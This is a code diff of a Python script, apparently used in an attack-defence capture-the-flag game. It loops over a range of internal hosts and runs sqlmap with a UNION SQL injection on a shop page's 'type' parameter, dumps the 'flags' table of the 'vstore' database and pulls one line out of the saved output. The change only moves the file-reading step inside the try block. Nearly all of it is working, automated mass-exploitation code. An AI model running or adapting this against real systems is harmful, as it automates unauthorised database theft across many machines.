@@ -9,15 +9,16 @@ while True:
             continue
         try:
             p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.{i}.2:4001/index.php?page=shop&type=VGA" --technique=U -D vstore -T flags --dump --batch > temp_web.txt""", shell=True)
-            sleep(5)  
+            sleep(5)            
+            with open("temp_web.txt","r") as f:
+                data=[]
+                for line in f:
+                    data.append(line)
+                print(data[-9])
+                flag.append(data[-9])
         except:
             print("error get flag")
-            sleep(5)   
-        with open("temp_web.txt","r") as f:
-            data=[]
-            for line in f:
-                data.append(line)
-            flag.append(data[-9])
+            sleep(5) 
 
 
     for line in flag:
